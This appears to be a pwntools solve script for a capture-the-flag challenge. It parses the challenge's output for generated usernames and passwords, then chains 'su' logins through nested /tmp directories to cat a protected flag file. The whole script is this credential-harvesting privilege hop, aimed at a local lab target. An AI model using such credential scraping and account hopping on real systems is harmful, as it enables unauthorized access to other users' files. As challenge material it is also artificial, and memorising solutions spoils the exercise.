#!/usr/bin/python3

from pwn import *
import re

context.log_level = 'error'

io = process("/challenge/run")

data = io.recvall().decode()

l = re.findall(r"dr-xr-x--x 3 root   [a-z_]+ 4096 [A-Z][a-z]{2} [0-3][0-9] [0-9][0-9]:[0-9][0-9] [a-z0-9_]+",data)
li = re.findall(r"Created user [a-z_]+ with password [a-z]+",data)
io.close()

u1 = li[0].split('Created user ')[1].split(' with password ')[0].strip()
p1 = li[0].split('Created user ')[1].split(' with password ')[1].strip()
u2 = li[1].split('Created user ')[1].split(' with password ')[0].strip()
p2 = li[1].split('Created user ')[1].split(' with password ')[1].strip()
u3 = li[2].split('Created user ')[1].split(' with password ')[0].strip()
p3 = li[2].split('Created user ')[1].split(' with password ')[1].strip()

print(u1,p1,"\n",u2,p2,u2,u3,l)

username = [u1 for lis in l if u1 in lis]
password = [p1 for lis in l if u1 in lis]
if username == []:
    username = [u2 for lis in l if u2 in lis]
    password = [p2 for lis in l if u2 in lis]
    if username == []:
        username = u3
        password = p3
    else:
        username= username[0].strip()
        password = password[0].strip()
else:
    username = username[0].strip()
    password = password[0].strip()
file_name =[lis.split()[-1] for lis in l if username in lis][0].strip()

print(username,password,file_name)
def checker(data):
    for d in data.split():
        if u1 in data:
            return (u1,p1)
        elif u2 in data:
            return (u2,p2)
        elif u3 in data:
            return (u3,p3)
    return (1,1)

io = process(['su',username])
io.sendline(password.encode())

io.sendline(b'ls -l /tmp/'+file_name.encode())
io.recvline()
data = io.recvline().decode()
print(data)
file = data.split()[-1].strip()
username,password = checker(data)
print(username,password)

io.sendline(b'su '+username.encode())
io.sendline(password.encode())
io.sendline(b'ls -l /tmp/'+file_name.encode()+b'/'+file.encode())
io.recvline()
data = io.recvline().decode()
print(data)
flag = data.split()[-1].strip()
username,password = checker(data)
print(username,password)


io.sendline(b'su '+username.encode())
io.sendline(password.encode())
io.sendline(b'cat /tmp/'+file_name.encode()+b'/'+file.encode()+b'/'+flag.encode())
io.interactive()
